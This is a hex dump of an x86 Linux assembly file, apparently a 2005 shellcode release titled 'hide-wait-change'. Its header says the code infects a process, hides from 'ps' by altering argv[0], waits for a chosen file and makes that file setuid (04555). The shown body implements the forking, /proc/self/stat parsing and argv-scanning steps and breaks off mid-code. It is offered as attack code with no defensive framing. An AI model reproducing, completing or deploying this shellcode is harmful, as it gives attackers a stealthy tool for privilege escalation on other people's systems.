00000000  23 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |#===============|
00000010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000050  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 23 0d  |==============#.|
00000060  0a 23 20 68 69 64 65 2d  77 61 69 74 2d 63 68 61  |.# hide-wait-cha|
00000070  6e 67 65 20 28 66 69 6e  61 6c 20 76 34 29 20 20  |nge (final v4)  |
00000080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000000b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |               #|
000000c0  0d 0a 23 20 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |..# ------------|
000000d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000110  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 20  |--------------- |
00000120  23 0d 0a 23 20 20 20 20  20 20 41 75 74 68 6f 72  |#..#      Author|
00000130  3a 20 78 6f 72 74 20 28  72 72 73 40 63 6c 79 64  |: xort (rrs@clyd|
00000140  65 2e 64 63 63 63 64 2e  65 64 75 29 20 20 20 20  |e.dcccd.edu)    |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000180  20 23 0d 0a 23 20 20 20  20 20 20 20 20 44 61 74  | #..#        Dat|
00000190  65 3a 20 30 39 2f 31 34  2f 32 30 30 35 20 33 3a  |e: 09/14/2005 3:|
000001a0  33 35 70 6d 20 20 20 20  20 20 20 20 20 20 20 20  |35pm            |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000001e0  20 20 23 20 0d 0a 23 20  20 20 20 20 20 20 20 54  |  # ..#        T|
000001f0  79 70 65 3a 20 73 68 65  6c 6c 63 6f 64 65 2f 28  |ype: shellcode/(|
00000200  78 38 36 2d 6c 69 6e 75  78 29 2e 73 2c 20 20 20  |x86-linux).s,   |
00000210  28 61 74 26 74 29 20 20  20 20 20 20 20 20 20 20  |(at&t)          |
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000240  20 20 20 20 23 0d 0a 23  20 20 20 20 20 20 20 20  |    #..#        |
00000250  53 69 7a 65 3a 20 73 74  72 6c 65 6e 28 66 61 6b  |Size: strlen(fak|
00000260  65 2d 70 72 6f 63 2d 6e  61 6d 65 29 20 2b 20 73  |e-proc-name) + s|
00000270  74 72 6c 65 6e 28 66 69  6c 65 2d 74 6f 2d 63 68  |trlen(file-to-ch|
00000280  61 6e 67 65 29 20 2b 20  31 38 37 20 20 20 20 20  |ange) + 187     |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002a0  20 20 20 20 20 23 0d 0a  23 20 44 69 73 63 72 69  |     #..# Discri|
000002b0  70 74 69 6f 6e 3a 20 54  68 69 73 20 69 73 20 61  |ption: This is a|
000002c0  20 73 68 65 6c 6c 63 6f  64 65 20 74 68 61 74 20  | shellcode that |
000002d0  77 69 6c 6c 20 69 6e 66  65 63 74 20 61 20 70 72  |will infect a pr|
000002e0  6f 63 65 73 73 2c 20 70  6c 61 79 20 73 6f 6d 65  |ocess, play some|
000002f0  20 61 72 67 76 5b 30 5d  20 67 61 6d 65 73 20 61  | argv[0] games a|
00000300  6d 6f 6e 67 20 20 23 0d  0a 23 20 20 20 20 20 20  |mong  #..#      |
00000310  20 20 20 20 20 20 20 20  6f 74 68 65 72 20 74 72  |        other tr|
00000320  69 63 6b 73 20 74 6f 20  68 69 64 65 20 69 74 73  |icks to hide its|
00000330  65 6c 66 20 66 72 6f 6d  20 27 70 73 27 2c 20 61  |elf from 'ps', a|
00000340  6e 64 20 77 61 69 74 73  20 75 6e 74 69 6c 20 74  |nd waits until t|
00000350  68 65 20 63 72 65 61 74  69 6f 6e 20 6f 66 20 61  |he creation of a|
00000360  20 20 20 20 20 20 20 23  0d 0a 23 20 20 20 20 20  |       #..#     |
00000370  20 20 20 20 20 20 20 20  20 73 70 65 63 69 66 69  |         specifi|
00000380  65 64 20 66 69 6c 65 2e  20 4f 6e 63 65 20 74 68  |ed file. Once th|
00000390  69 73 20 66 69 6c 65 20  69 73 20 66 6f 75 6e 64  |is file is found|
000003a0  20 74 6f 20 65 78 69 73  74 2c 20 69 74 73 20 70  | to exist, its p|
000003b0  65 72 6d 69 73 73 69 6f  6e 73 20 61 72 65 20 63  |ermissions are c|
000003c0  68 61 6e 67 65 64 20 20  23 0d 0a 23 20 20 20 20  |hanged  #..#    |
000003d0  20 20 20 20 20 20 20 20  20 20 74 6f 20 30 34 35  |          to 045|
000003e0  35 35 2e 20 4f 72 69 67  69 6e 61 6c 20 63 6f 6e  |55. Original con|
000003f0  63 65 70 74 20 63 6f 6e  63 69 76 65 64 20 62 79  |cept concived by|
00000400  20 69 7a 69 6b 2e 20 20  20 20 20 20 20 20 20 20  | izik.          |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000420  20 20 20 20 20 20 20 20  20 23 0d 0a 23 23 23 23  |         #..####|
00000430  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000480  23 23 23 23 23 23 23 23  23 23 23 0d 0a 0d 0a 2e  |###########.....|
00000490  73 65 63 74 69 6f 6e 20  2e 74 65 78 74 0d 0a 0d  |section .text...|
000004a0  0a 09 2e 67 6c 6f 62 61  6c 20 5f 73 74 61 72 74  |...global _start|
000004b0  0d 0a 0d 0a 20 20 20 20  20 20 20 20 23 23 23 23  |....        ####|
000004c0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000500  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 0d  |###############.|
00000510  0a 20 20 20 20 20 20 20  20 23 23 20 20 20 20 20  |.        ##     |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000560  20 20 20 20 20 20 20 20  20 20 23 23 0d 0a 20 20  |          ##..  |
00000570  20 20 20 20 20 20 23 23  20 5f 73 74 61 72 74 3a  |      ## _start:|
00000580  20 31 29 20 66 6f 72 6b  28 29 20 61 20 6e 65 77  | 1) fork() a new|
00000590  20 70 72 6f 63 65 73 73  20 20 20 20 20 20 20 20  | process        |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000005c0  20 20 20 20 20 20 20 23  23 0d 0a 20 20 20 20 20  |       ##..     |
000005d0  20 20 20 23 23 20 20 20  20 20 20 20 20 20 32 29  |   ##         2)|
000005e0  20 63 68 65 63 6b 20 74  6f 20 73 65 65 20 69 66  | check to see if|
000005f0  20 77 65 20 61 72 65 20  63 68 69 6c 64 20 70 72  | we are child pr|
00000600  6f 63 65 73 73 20 20 20  20 20 20 20 20 20 20 20  |ocess           |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000620  20 20 20 20 23 23 0d 0a  20 20 20 20 20 20 20 20  |    ##..        |
00000630  23 23 20 20 20 20 20 20  20 20 20 33 29 20 69 66  |##         3) if|
00000640  20 77 65 20 61 72 65 20  74 68 65 6e 20 5f 65 78  | we are then _ex|
00000650  69 74 28 29 20 20 20 20  20 20 20 20 20 20 20 20  |it()            |
00000660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000680  20 23 23 0d 0a 20 20 20  20 20 20 20 20 23 23 20  | ##..        ## |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000006d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 23  |              ##|
000006e0  0d 0a 20 20 20 20 20 20  20 20 23 23 23 23 23 23  |..        ######|
000006f0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000730  23 23 23 23 23 23 23 23  23 23 23 23 23 0d 0a 0d  |#############...|
00000740  0a 0d 0a 09 5f 73 74 61  72 74 3a 0d 0a 0d 0a 0d  |...._start:.....|
00000750  0a 09 20 20 20 20 20 20  23 2d 2d 2d 2d 2d 2d 2d  |..      #-------|
00000760  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000780  2d 2d 2d 2d 23 0d 0a 09  20 20 20 20 20 20 23 20  |----#...      # |
00000790  77 65 20 73 74 61 72 74  20 77 69 74 68 20 61 20  |we start with a |
000007a0  66 6f 72 6b 28 29 20 20  20 20 20 20 20 20 20 20  |fork()          |
000007b0  20 20 20 20 20 20 20 20  20 20 23 0d 0a 09 20 20  |          #...  |
000007c0  20 20 20 20 23 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |    #-----------|
000007d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000007f0  23 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |#..             |
00000800  20 20 20 20 0d 0a 09 20  20 20 20 20 20 70 75 73  |    ...      pus|
00000810  68 20 24 30 78 30 32 0d  0a 20 20 20 20 20 20 20  |h $0x02..       |
00000820  20 20 20 20 20 20 20 70  6f 70 20 25 65 61 78 09  |       pop %eax.|
00000830  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000840  69 6e 74 20 24 30 78 38  30 0d 0a 09 09 0d 0a 20  |int $0x80...... |
00000850  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 0d  |               .|
00000860  0a 09 20 20 20 20 20 20  23 2d 2d 2d 2d 2d 2d 2d  |..      #-------|
00000870  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000890  2d 2d 2d 2d 23 0d 0a 09  20 20 20 20 20 20 23 20  |----#...      # |
000008a0  63 68 69 6c 64 20 6f 72  20 70 61 72 65 6e 74 3f  |child or parent?|
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  20 20 20 20 20 20 20 20  20 20 23 0d 0a 09 20 20  |          #...  |
000008d0  20 20 20 20 23 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |    #-----------|
000008e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000900  23 0d 0a 09 09 0d 0a 09  20 20 20 20 20 20 74 65  |#.......      te|
00000910  73 74 20 25 65 61 78 2c  20 25 65 61 78 0d 0a 09  |st %eax, %eax...|
00000920  20 20 20 20 20 20 6a 65  20 70 72 6f 63 5f 6e 61  |      je proc_na|
00000930  6d 65 0d 0a 09 0d 0a 0d  0a 09 20 20 20 20 20 20  |me........      |
00000940  23 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |#---------------|
00000950  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000960  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 23 0d 0a 09  |------------#...|
00000970  20 20 20 20 20 20 23 20  70 61 72 65 6e 74 20 67  |      # parent g|
00000980  6f 65 73 20 65 78 69 74  28 29 20 20 20 20 20 20  |oes exit()      |
00000990  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009a0  20 20 23 0d 0a 09 20 20  20 20 20 20 23 2d 2d 2d  |  #...      #---|
000009b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000009d0  2d 2d 2d 2d 2d 2d 2d 2d  23 0d 0a 0d 0a 09 20 20  |--------#.....  |
000009e0  20 20 20 20 70 75 73 68  20 24 30 78 30 31 0d 0a  |    push $0x01..|
000009f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 6f  |              po|
00000a00  70 20 25 65 61 78 20 0d  0a 09 20 20 20 20 20 20  |p %eax ...      |
00000a10  69 6e 74 20 24 30 78 38  30 20 20 0d 0a 20 20 20  |int $0x80  ..   |
00000a20  20 20 20 20 20 20 20 20  20 20 0d 0a 0d 0a 20 20  |          ....  |
00000a30  20 20 20 20 20 20 23 23  23 23 23 23 23 23 23 23  |      ##########|
00000a40  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000a80  23 23 23 23 23 23 23 23  23 0d 0a 20 20 20 20 20  |#########..     |
00000a90  20 20 20 23 23 20 20 20  20 20 20 20 20 20 20 20  |   ##           |
00000aa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000ae0  20 20 20 20 23 23 0d 0a  20 20 20 20 20 20 20 20  |    ##..        |
00000af0  23 23 20 20 20 20 20 20  20 20 20 31 29 20 67 65  |##         1) ge|
00000b00  74 20 61 64 64 72 65 73  73 20 6f 66 20 22 2f 70  |t address of "/p|
00000b10  72 6f 63 2f 73 65 6c 66  2f 73 74 61 74 22 20 61  |roc/self/stat" a|
00000b20  6e 64 20 66 69 78 20 6e  75 6c 6c 40 65 6e 64 20  |nd fix null@end |
00000b30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b40  20 23 23 0d 0a 20 20 20  20 20 20 20 20 23 23 20  | ##..        ## |
00000b50  20 20 20 20 20 20 20 20  32 29 20 6f 70 65 6e 28  |        2) open(|
00000b60  29 20 22 2f 70 72 6f 63  2f 73 65 6c 66 2f 73 74  |) "/proc/self/st|
00000b70  61 74 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |at"             |
00000b80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 23  |              ##|
00000ba0  0d 0a 20 20 20 20 20 20  20 20 23 23 20 20 20 20  |..        ##    |
00000bb0  20 20 20 20 20 33 29 20  72 65 61 64 20 69 6e 20  |     3) read in |
00000bc0  32 35 30 20 62 79 74 65  73 20 66 72 6f 6d 20 66  |250 bytes from f|
00000bd0  69 6c 65 20 20 20 20 20  20 20 20 20 20 20 20 20  |ile             |
00000be0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bf0  20 20 20 20 20 20 20 20  20 20 20 23 23 0d 0a 20  |           ##.. |
00000c00  20 20 20 20 20 20 20 23  23 20 20 20 20 20 20 20  |       ##       |
00000c10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000c50  20 20 20 20 20 20 20 20  23 23 0d 0a 20 20 20 20  |        ##..    |
00000c60  20 20 20 20 23 23 23 23  23 23 23 23 23 23 23 23  |    ############|
00000c70  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000cb0  23 23 23 23 23 23 23 0d  0a 0d 0a 0d 0a 20 20 20  |#######......   |
00000cc0  20 20 20 20 20 20 20 20  20 20 20 23 2d 2d 2d 2d  |           #----|
00000cd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000cf0  2d 2d 2d 2d 2d 2d 2d 23  20 20 20 20 20 20 20 20  |-------#        |
00000d00  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00000d10  20 20 20 20 20 23 20 67  72 61 62 20 22 2f 70 72  |     # grab "/pr|
00000d20  6f 63 22 20 73 74 72 69  6e 67 20 6c 6f 63 61 74  |oc" string locat|
00000d30  69 6f 6e 20 20 20 20 20  20 20 20 20 20 20 20 20  |ion             |
00000d40  20 23 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  | #..            |
00000d50  20 20 23 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  #-------------|
00000d60  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000d70  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 23 0d  |--------------#.|
00000d80  0a 0d 0a 20 72 65 74 5f  77 5f 70 72 6f 63 3a 20  |... ret_w_proc: |
00000d90  20 70 6f 70 20 25 65 62  78 0d 0a 20 20 20 20 20  | pop %ebx..     |
00000da0  20 20 20 20 20 20 20 20  20 6c 65 61 20 30 78 31  |         lea 0x1|
00000db0  30 28 25 65 62 78 29 2c  20 25 65 73 69 20 20 20  |0(%ebx), %esi   |
00000dc0  20 20 20 20 20 20 20 20  20 20 20 0d 0a 0d 0a 20  |           .... |
00000dd0  20 20 20 20 20 20 20 20  20 20 20 20 20 23 2d 2d  |             #--|
00000de0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000e00  2d 2d 2d 2d 2d 2d 2d 2d  2d 23 0d 0a 09 20 20 20  |---------#...   |
00000e10  20 20 20 23 20 66 69 78  20 22 2f 70 72 6f 63 22  |   # fix "/proc"|
00000e20  20 73 74 72 69 6e 67 20  74 6f 20 69 6e 63 6c 75  | string to inclu|
00000e30  64 65 20 63 2d 73 74 72  69 6e 67 20 20 20 20 23  |de c-string    #|
00000e40  0d 0a 09 20 20 20 20 20  20 23 20 74 65 72 6d 69  |...      # termi|
00000e50  6e 61 74 6f 72 20 20 20  20 20 20 20 20 20 20 20  |nator           |
00000e60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e70  20 20 20 20 20 23 0d 0a  09 20 20 20 20 20 20 23  |     #...      #|
00000e80  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000ea0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 23 0d 0a 09 20  |-----------#... |
00000eb0  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00000ec0  20 20 20 20 20 69 6e 63  62 20 30 78 66 28 25 65  |     incb 0xf(%e|
00000ed0  62 78 29 0d 0a 0d 0a 0d  0a 09 23 23 23 23 23 23  |bx).......######|
00000ee0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000f20  23 23 23 23 23 23 23 23  23 23 23 23 23 0d 0a 20  |#############.. |
00000f30  20 20 20 20 20 20 20 23  23 20 20 20 20 20 20 20  |       ##       |
00000f40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000f80  20 20 20 20 20 20 20 20  23 23 0d 0a 20 20 20 20  |        ##..    |
00000f90  20 20 20 20 23 23 20 4f  70 65 6e 20 22 2f 70 72  |    ## Open "/pr|
00000fa0  6f 63 2f 73 65 6c 66 2f  73 74 61 74 22 20 61 6e  |oc/self/stat" an|
00000fb0  64 20 72 65 61 64 20 69  6e 20 32 35 30 20 62 79  |d read in 250 by|
00000fc0  74 65 73 20 20 20 20 20  20 20 20 20 20 20 20 20  |tes             |
00000fd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000fe0  20 20 20 20 20 23 23 0d  0a 20 20 20 20 20 20 20  |     ##..       |
00000ff0  20 23 23 20 20 20 20 20  20 20 20 20 20 20 20 20  | ##             |
00001000  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001040  20 20 23 23 0d 0a 20 20  20 20 20 20 20 20 23 23  |  ##..        ##|
00001050  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
000010a0  23 0d 0a 0d 0a 0d 0a 20  20 20 20 20 20 20 20 20  |#......         |
000010b0  20 20 20 20 20 23 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |     #----------|
000010c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000010e0  2d 23 0d 0a 09 20 20 20  20 20 20 23 20 6f 70 65  |-#...      # ope|
000010f0  6e 28 29 20 74 68 65 20  66 69 6c 65 20 20 20 20  |n() the file    |
00001100  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001110  20 20 20 20 20 20 20 23  0d 0a 09 20 20 20 20 20  |       #...     |
00001120  20 23 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | #--------------|
00001130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00001140  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 23 0d 0a  |-------------#..|
00001150  09 20 20 20 20 20 20 0d  0a 09 20 20 20 20 20 20  |.      ...      |
00001160  63 64 71 20 0d 0a 09 20  20 20 20 20 20 78 6f 72  |cdq ...      xor|
00001170  20 25 65 63 78 2c 20 25  65 63 78 0d 0a 20 20 20  | %ecx, %ecx..   |
00001180  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 62 20  |           movb |
00001190  24 30 78 35 2c 20 25 61  6c 0d 0a 20 20 20 20 20  |$0x5, %al..     |
000011a0  20 20 20 20 20 20 20 20  20 69 6e 74 20 24 30 78  |         int $0x|
000011b0  38 30 0d 0a 09 20 20 20  20 20 20 09 20 20 20 20  |80...      .    |
000011c0  20 20 0d 0a 0d 0a 09 20  20 20 20 20 20 23 2d 2d  |  .....      #--|
000011d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000011f0  2d 2d 2d 2d 2d 2d 2d 2d  23 0d 0a 09 20 20 20 20  |--------#...    |
00001200  20 20 23 20 72 65 61 64  28 29 20 32 35 30 2d 62  |  # read() 250-b|
00001210  79 74 65 73 20 66 72 6f  6d 20 74 68 65 20 66 69  |ytes from the fi|
00001220  6c 65 20 69 6e 74 6f 20  20 20 20 20 20 23 0d 0a  |le into      #..|
00001230  09 20 20 20 20 20 20 23  20 45 53 50 2d 32 35 30  |.      # ESP-250|
00001240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001260  20 20 23 0d 0a 09 20 20  20 20 20 20 23 2d 2d 2d  |  #...      #---|
00001270  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001290  2d 2d 2d 2d 2d 2d 2d 23  0d 0a 09 20 20 20 20 20  |-------#...     |
000012a0  20 0d 0a 09 20 20 20 20  20 20 78 63 68 67 20 25  | ...      xchg %|
000012b0  65 61 78 2c 20 25 65 62  78 20 23 20 73 74 6f 72  |eax, %ebx # stor|
000012c0  65 20 66 64 2d 70 6f 69  6e 74 65 72 20 69 6e 20  |e fd-pointer in |
000012d0  65 62 78 0d 0a 09 20 20  20 20 20 20 70 75 73 68  |ebx...      push|
000012e0  20 24 30 78 33 0d 0a 20  20 20 20 20 20 20 20 20  | $0x3..         |
000012f0  20 20 20 20 20 70 6f 70  20 25 65 61 78 0d 0a 09  |     pop %eax...|
00001300  20 20 20 20 20 20 6d 6f  76 62 20 24 32 35 30 2c  |      movb $250,|
00001310  20 25 64 6c 20 20 20 20  20 20 0d 0a 09 20 20 20  | %dl      ...   |
00001320  20 20 20 6d 6f 76 20 25  65 73 70 2c 20 25 65 63  |   mov %esp, %ec|
00001330  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 0d  |x              .|
00001340  0a 09 20 20 20 20 20 20  73 75 62 20 25 65 64 78  |..      sub %edx|
00001350  2c 20 25 65 63 78 0d 0a  20 20 20 20 20 20 20 20  |, %ecx..        |
00001360  20 20 20 20 20 20 69 6e  74 20 24 30 78 38 30 20  |      int $0x80 |
00001370  20 0d 0a 09 20 20 20 20  20 20 0d 0a 09 20 20 20  | ...      ...   |
00001380  20 20 20 6d 6f 76 20 25  65 63 78 2c 20 25 65 64  |   mov %ecx, %ed|
00001390  69 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |i..             |
000013a0  20 61 64 64 20 25 65 61  78 2c 20 25 65 64 69 0d  | add %eax, %edi.|
000013b0  0a 09 20 20 20 20 20 20  0d 0a 0d 0a 09 23 23 23  |..      .....###|
000013c0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00001410  0d 0a 20 20 20 20 20 20  20 20 23 23 20 20 20 20  |..        ##    |
00001420  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001460  20 20 20 20 20 20 20 20  20 20 20 23 23 0d 0a 20  |           ##.. |
00001470  20 20 20 20 20 20 20 23  23 20 20 20 20 20 20 31  |       ##      1|
00001480  29 20 47 65 74 20 6c 6f  63 61 74 69 6f 6e 20 6f  |) Get location o|
00001490  66 20 70 6f 69 6e 74 65  72 20 74 6f 20 61 72 67  |f pointer to arg|
000014a0  76 5b 30 5d 20 66 72 6f  6d 20 66 69 6c 65 20 28  |v[0] from file (|
000014b0  4e 46 2d 31 33 29 20 20  20 20 20 20 20 20 20 20  |NF-13)          |
000014c0  20 20 20 20 20 20 20 20  23 23 20 0d 0a 20 20 20  |        ## ..   |
000014d0  20 20 20 20 20 23 23 20  20 20 20 20 20 32 29 20  |     ##      2) |
000014e0  43 6f 6e 76 65 72 74 20  69 74 20 74 6f 20 62 69  |Convert it to bi|
000014f0  6e 61 72 79 20 20 20 20  20 20 20 20 20 20 20 20  |nary            |
00001500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001520  20 20 20 20 20 20 23 23  0d 0a 20 20 20 20 20 20  |      ##..      |
00001530  20 20 23 23 20 20 20 20  20 20 33 29 20 75 73 65  |  ##      3) use|
00001540  20 74 68 61 74 20 74 6f  20 66 69 6e 64 20 72 65  | that to find re|
00001550  61 6c 20 61 72 67 76 5b  30 5d 73 20 6c 6f 63 61  |al argv[0]s loca|
00001560  74 69 6f 6e 20 20 20 20  20 20 20 20 20 20 20 20  |tion            |
00001570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001580  20 20 20 23 23 0d 0a 20  20 20 20 20 20 20 20 23  |   ##..        #|
00001590  23 20 20 20 20 20 20 34  29 20 6e 75 6c 6c 2d 6f  |#      4) null-o|
000015a0  75 74 20 61 6c 6c 20 61  72 67 73 20 77 69 74 68  |ut all args with|
000015b0  20 30 78 30 20 20 20 20  20 20 20 20 20 20 20 20  | 0x0            |
000015c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000015e0  23 23 0d 0a 20 20 20 20  20 20 20 20 23 23 20 20  |##..        ##  |
000015f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001630  20 20 20 20 20 20 20 20  20 20 20 20 20 23 23 0d  |             ##.|
00001640  0a 09 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |..##############|
00001650  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00001690  23 23 23 23 23 0d 0a 0d  0a 0d 0a 09 20 20 20 20  |#####.......    |
000016a0  20 20 23 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  #-------------|
000016b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000016c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 23 0d 0a  |-------------#..|
000016d0  09 20 20 20 20 20 20 23  20 73 63 61 6e 20 66 6f  |.      # scan fo|
000016e0  72 20 74 68 65 20 64 65  63 69 6d 61 6c 2d 73 74  |r the decimal-st|
000016f0  72 69 6e 67 20 6f 66 20  74 68 65 20 20 20 20 20  |ring of the     |
00001700  20 20 23 0d 0a 09 20 20  20 20 20 20 23 20 6c 6f  |  #...      # lo|
00001710  63 61 74 69 6f 6e 20 6f  66 20 61 72 67 63 20 26  |cation of argc &|
00001720  20 61 72 67 76 5b 30 5d  20 20 20 20 20 20 20 20  | argv[0]        |
00001730  20 20 20 20 20 20 20 23  0d 0a 09 20 20 20 20 20  |       #...     |
00001740  20 23 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | #--------------|
00001750  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00001760  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 23 09 20 20  |------------#.  |
00001770  20 20 20 20 0d 0a 09 20  20 20 20 20 20 0d 0a 09  |    ...      ...|
00001780  20 20 20 20 20 20 78 63  68 67 20 25 65 61 78 2c  |      xchg %eax,|
00001790  20 25 65 62 78 0d 0a 09  20 20 20 20 20 20 0d 0a  | %ebx...      ..|
000017a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 73 74  |              st|
000017b0  64 0d 0a 09 20 20 20 20  20 20 70 75 73 68 20 24  |d...      push $|
000017c0  30 78 32 30 0d 0a 20 20  20 20 20 20 20 20 20 20  |0x20..          |
000017d0  20 20 20 20 70 6f 70 20  25 65 61 78 0d 0a 09 20  |    pop %eax... |
000017e0  20 20 20 20 20 70 75 73  68 20 24 31 34 0d 0a 20  |     push $14.. |
000017f0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 6f 70  |             pop|
00001800  20 25 65 63 78 0d 0a 09  20 20 20 20 20 0d 0a 20  | %ecx...     .. |
00001810  20 66 69 6e 64 61 72 67  73 3a 0d 0a 20 20 20 20  | findargs:..    |
00001820  20 20 20 20 20 20 20 20  20 20 78 63 68 67 20 25  |          xchg %|
00001830  65 63 78 2c 20 25 65 62  78 20 20 20 20 20 20 0d  |ecx, %ebx      .|
00001840  0a 09 20 20 20 20 20 20  72 65 70 6e 65 20 73 63  |..      repne sc|
00001850  61 73 62 0d 0a 09 20 20  20 20 20 20 78 63 68 67  |asb...      xchg|
00001860  20 25 65 63 78 2c 20 25  65 62 78 0d 0a 09 20 20  | %ecx, %ebx...  |
